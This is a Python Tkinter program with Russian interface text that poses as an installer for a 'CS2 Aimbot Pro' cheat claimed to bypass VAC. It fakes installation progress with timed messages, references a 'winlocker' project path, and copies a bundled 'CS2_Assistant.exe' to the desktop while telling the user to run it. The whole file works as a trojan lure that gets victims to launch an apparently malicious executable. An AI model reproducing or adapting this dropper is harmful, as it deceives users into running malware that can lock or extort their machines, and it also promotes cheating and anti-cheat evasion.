import os
import sys
import shutil
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox
from pathlib import Path
import threading
import time

class CheatInstaller:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("OceanEyes Aimbot Pro v2.3 - Установка")
        self.root.geometry("1200x800")
        self.root.configure(bg='#0a0a1a')
        self.root.resizable(False, False)
        
        try:
            self.root.iconbitmap('icon.ico')
        except:
            pass
        
        self.setup_ui()
        
    def setup_ui(self):
        header_frame = tk.Frame(self.root, bg='#0a0a1a')
        header_frame.pack(pady=20)
        
        tk.Label(header_frame, 
                text="🌊 OceanEyes Aimbot Pro v2.3 🌊",
                font=("Arial", 18, "bold"),
                fg='#00ffff',
                bg='#0a0a1a').pack()
        
        tk.Label(header_frame,
                text="Ирина Егорова | @oceaneyesii",
                font=("Arial", 14),
                fg='#8888ff',
                bg='#0a0a1a').pack()
        
        logo_frame = tk.Frame(self.root, bg='#0a0a1a')
        logo_frame.pack(pady=10)
        
        logo_text = """
        ╔═══════════════════════════════╗
        ║     CS2 AIMBOT PRO v2.3       ║
        ║      by Irina Egorova         ║
        ║    🔫 100% Legit | Undetected ║
        ╚═══════════════════════════════╝
        """
        tk.Label(logo_frame,
                text=logo_text,
                font=("Courier", 10),
                fg='#00ff00',
                bg='#0a0a1a',
                justify='left').pack()
        
        info_frame = tk.Frame(self.root, bg='#1a1a2e', bd=2, relief='ridge')
        info_frame.pack(pady=20, padx=20, fill='both', expand=True)
        
        features = [
            "✓ Perfect Aimbot с настройкой сглаживания",
            "✓ Wallhack с настройкой прозрачности",
            "✓ Triggerbot с задержкой",
            "✓ ESP: здоровье, имена, оружие",
            "✓ Bhop и AutoStrafe",
            "✓ 100% безопасно - байпас VAC",
            "✓ Русскоязычная поддержка",
            "✓ Автообновление"
        ]
        
        for feature in features:
            tk.Label(info_frame,
                    text=feature,
                    font=("Arial", 10),
                    fg='#ffffff',
                    bg='#1a1a2e',
                    anchor='w').pack(anchor='w', padx=10, pady=2)
        
        self.progress = ttk.Progressbar(self.root, 
                                       length=400,
                                       mode='determinate')
        self.progress.pack(pady=20)
        
        self.status_label = tk.Label(self.root,
                                   text="Готов к установке...",
                                   font=("Arial", 10),
                                   fg='#ffff00',
                                   bg='#0a0a1a')
        self.status_label.pack()
        
        button_frame = tk.Frame(self.root, bg='#0a0a1a')
        button_frame.pack(pady=20)
        
        tk.Button(button_frame,
                 text="Установить",
                 command=self.start_installation,
                 bg='#00aa00',
                 fg='white',
                 font=("Arial", 12, "bold"),
                 padx=30,
                 pady=10).pack(side='left', padx=10)
        
        tk.Button(button_frame,
                 text="Отмена",
                 command=self.root.destroy,
                 bg='#aa0000',
                 fg='white',
                 font=("Arial", 12),
                 padx=30,
                 pady=10).pack(side='left', padx=10)
    
    def start_installation(self):
        thread = threading.Thread(target=self.install_cheat)
        thread.daemon = True
        thread.start()
    
    def install_cheat(self):
        try:
            self.status_label.config(text="Подготовка файлов...")
            self.progress['value'] = 10
            self.root.update()
            time.sleep(1)
            
            self.status_label.config(text="Скачивание ядра...")
            self.progress['value'] = 30
            self.root.update()
            time.sleep(2)
            
            self.status_label.config(text="Настройка байпаса...")
            self.progress['value'] = 50
            self.root.update()
            time.sleep(1)
            
            self.status_label.config(text="Создание конфигурации...")
            self.progress['value'] = 70
            self.root.update()
            time.sleep(1)
            
            self.status_label.config(text="Создание ярлыка...")
            self.progress['value'] = 90
            self.root.update()
            
            source_script = r"C:\Data\projects\winlocker\main.py"
            
            if os.path.exists(source_script):
                self.create_exe_on_desktop(source_script)
                self.progress['value'] = 100
                self.status_label.config(text="Установка завершена! ✅", fg='#00ff00')
                
                messagebox.showinfo("Успех!", 
                                  "OceanEyes Aimbot успешно установлен!\n\n"
                                  "Ярлык создан на рабочем столе.\n"
                                  "Запустите 'CS2_Assistant.exe' для активации чита.")
                
                self.root.after(500, self.root.destroy)
            else:
                messagebox.showerror("Ошибка", "Основной файл не найден!")
                self.status_label.config(text="Ошибка установки! ❌", fg='#ff0000')
                
        except Exception as e:
            messagebox.showerror("Ошибка", f"Ошибка установки: {str(e)}")
            self.status_label.config(text="Ошибка установки! ❌", fg='#ff0000')
    
    def create_exe_on_desktop(self, script_path):
        try:
            desktop = Path.home() / "Desktop"
            exe_path = desktop / "CS2_Assistant.exe"
            
            if getattr(sys, 'frozen', False):
                temp_dir = sys._MEIPASS
                print(f"Временная папка PyInstaller: {temp_dir}")
                
                print("Содержимое временной папки:")
                for item in os.listdir(temp_dir):
                    print(f"  - {item}")
                
                source_exe = os.path.join(temp_dir, "CS2_Assistant.exe")
                print(f"Ищем .exe по пути: {source_exe}")
                
                if os.path.exists(source_exe):
                    shutil.copy2(source_exe, exe_path)
                    print(f"CS2_Assistant.exe скопирован на рабочий стол: {exe_path}")
                else:
                    print(f"ОШИБКА: CS2_Assistant.exe не найден в {temp_dir}")
                    messagebox.showerror("Ошибка", 
                                    f"CS2_Assistant.exe не найден во временной папке!\n"
                                    f"Проверьте параметры сборки --add-data")
                    return False
                
                assets_source = os.path.join(temp_dir, "assets")
                assets_target = desktop / "assets"
                
                print(f"Ищем assets по пути: {assets_source}")
                
                if os.path.exists(assets_source) and os.path.isdir(assets_source):
                    print(f"Найдена папка assets, копируем...")
                    
                    os.makedirs(assets_target, exist_ok=True)
                    
                    for item in os.listdir(assets_source):
                        src_item = os.path.join(assets_source, item)
                        dst_item = os.path.join(assets_target, item)
                        
                        print(f"Копируем: {item}")
                        
                        if os.path.isdir(src_item):
                            shutil.copytree(src_item, dst_item, dirs_exist_ok=True)
                        else:
                            shutil.copy2(src_item, dst_item)
                    
                    print(f"Assets скопированы в: {assets_target}")
                else:
                    print(f"Папка assets не найдена по пути: {assets_source}")
                
                return True
                
            else:
                print("Режим разработки (.py)")
                base_path = os.path.dirname(os.path.abspath(__file__))
                print(f"Папка скрипта: {base_path}")
                
                source_exe = os.path.join(base_path, "CS2_Assistant.exe")
                
                if not os.path.exists(source_exe):
                    source_exe = os.path.join(base_path, "dist", "CS2_Assistant.exe")
                
                if os.path.exists(source_exe):
                    shutil.copy2(source_exe, exe_path)
                    
                    assets_target = desktop / "assets"
                    os.makedirs(assets_target, exist_ok=True)
                    
                    assets_source = os.path.join(base_path, "assets")
                    if os.path.exists(assets_source) and os.path.isdir(assets_source):
                        for item in os.listdir(assets_source):
                            src_item = os.path.join(assets_source, item)
                            dst_item = os.path.join(assets_target, item)
                            
                            if os.path.isdir(src_item):
                                shutil.copytree(src_item, dst_item, dirs_exist_ok=True)
                            else:
                                shutil.copy2(src_item, dst_item)
                    
                    print(f"Файл скопирован: {exe_path}")
                    return True
                else:
                    print(f"Файл не найден по пути: {source_exe}")
                    
                    messagebox.showwarning("Тестовый режим", 
                                        "В режиме разработки файл не найден.\n"
                                        "Для тестирования создан тестовый файл.")
                    with open(exe_path, 'w') as f:
                        f.write("Тестовый файл CS2 Assistant")
                    return True
                
        except Exception as e:
            print(f"Ошибка при создании .exe: {e}")
            import traceback
            traceback.print_exc()
            messagebox.showerror("Ошибка", f"Не удалось создать файл: {str(e)}")
            return False
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    installer = CheatInstaller()
    installer.run()
